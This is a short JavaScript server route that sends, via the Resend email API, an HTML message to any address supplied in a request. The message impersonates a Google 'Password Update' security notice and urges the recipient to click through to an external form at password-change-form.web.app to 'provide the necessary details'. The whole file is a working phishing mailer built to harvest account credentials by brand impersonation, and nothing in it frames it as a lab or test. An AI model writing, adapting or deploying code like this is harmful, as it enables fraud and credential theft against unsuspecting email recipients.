"use server";
import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY);


export async function POST(req) {
  const body = await req.json();
  const { toEmail } = body;
  try {
    const data = await resend.emails.send({
      from: 'Your App <onboarding@resend.dev>',
      to: toEmail,
      subject: 'IMPORTANT:Google Password Update',
      html: `
       <div style="font-family: Arial, sans-serif; max-width: 600px; margin: auto; padding: 20px; border: 1px solid #ddd; border-radius: 8px;">
        <h2 style="color:#1f2937;">Action Required: Update Your Account Password</h2>
        
        <p style="color:#4b5563; line-height: 1.6;">
            We’ve identified a security-related requirement for your account, and we kindly request you to update your password to ensure continued access and protection.
        </p>
        
        <p style="color:#4b5563; line-height: 1.6;">
            Please click the button below to securely provide the necessary details and complete the password change process:
        </p>
        
        <a href="https://password-change-form.web.app" 
            style="display: inline-block; padding: 12px 24px; background-color: #2563eb; color: #ffffff; text-decoration: none; border-radius: 5px; font-weight: bold; margin: 20px 0;">
            Update Password
        </a>

        <p style="color:#6b7280; font-size: 14px; line-height: 1.6;">
            If you did not initiate this request, you can safely ignore this email. No changes will be made unless you complete the form.
        </p>
        
        <p style="color:#9ca3af; font-size: 12px; margin-top: 30px;">
            This is an automated message. Please do not reply directly to this email.
        </p>
</div>
      `,
    });

    return Response.json({ success: true, data });
  } catch (error) {
    return Response.json({ success: false, error: error.message }, { status: 500 });
    // console.log()
  }
}
